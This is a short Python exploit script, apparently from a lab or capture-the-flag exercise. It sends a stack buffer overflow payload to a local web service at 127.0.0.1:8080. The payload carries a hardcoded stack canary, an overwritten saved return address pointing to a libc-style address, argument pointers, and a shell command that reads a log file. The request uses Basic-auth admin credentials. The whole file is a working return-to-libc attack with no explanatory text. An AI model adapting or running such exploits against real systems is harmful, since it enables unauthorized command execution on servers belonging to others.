import requests

headers = {
    'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://127.0.0.1:8080',
    'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
    'Connection': 'keep-alive',
    'Referer': 'http://127.0.0.1:8080/',
    'Upgrade-Insecure-Requests': '1',
}

data = b'A' * 100  # <-- buffer check
ba = bytearray.fromhex("fcd7c600")  # <-- canary
ba.reverse()
data += ba
data += b'A' * 12  # <-- saved $ebp check 0xbfffef98
ba = bytearray.fromhex("b7c55da0")  # <-- saved eip
ba.reverse()
data += ba
ba = bytearray.fromhex("bfffee14")  # <-- char**
ba.reverse()
data += ba
ba = bytearray.fromhex("bfffee18")  # <-- char*
ba.reverse()
data += ba
data += b"cat /var/log/z.log"

data += b'\x00'
print(data)
try:
    response = requests.post('http://127.0.0.1:8080/ultimate.html', headers=headers, data=data)
    status_code = response.status_code
    print("status_code = [" + str(status_code) + "]")
    print("text = [" + response.text + "]")
except requests.exceptions.RequestException as e:
    print(e)
